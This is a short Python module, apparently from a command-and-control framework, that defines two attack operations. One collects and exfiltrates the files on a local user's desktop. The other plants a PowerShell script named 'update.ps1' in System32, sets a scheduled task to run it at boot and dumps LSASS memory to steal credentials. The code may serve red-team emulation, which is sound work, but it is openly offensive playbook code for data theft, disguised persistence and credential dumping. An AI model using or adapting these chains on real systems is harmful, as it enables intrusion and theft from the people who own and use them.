from c2.c2_operations import C2Operation
import c2.concrete_actions as c2actions


def desktop_exfiltration():
    actions = [
        c2actions.find_local_users(),
        c2actions.list_target_local_user_desktop(),
        c2actions.read_staged_files()
    ]
    name = "Desktop exfiltration (Thief)"
    description = "Discover local users, select the first one, collect the list of files " \
                  "on its desktop and exfiltrate them"
    operation = C2Operation(actions, name, description)
    return operation


def persistence_and_credential_access():
    actions = [
        c2actions.write_file("update.ps1", "\\??\\C:\\Windows\\System32\\update.ps1"),
        c2actions.install_schtask(),
        c2actions.get_system_version(),
        c2actions.dump_lsass_process()
    ]
    name = "Persistence and credential access"
    description = "Upload a powershell script and install a scheduled task that executes that " \
                  "script at boot, get system version and dump memory of LSASS process"
    operation = C2Operation(actions, name, description)
    return operation
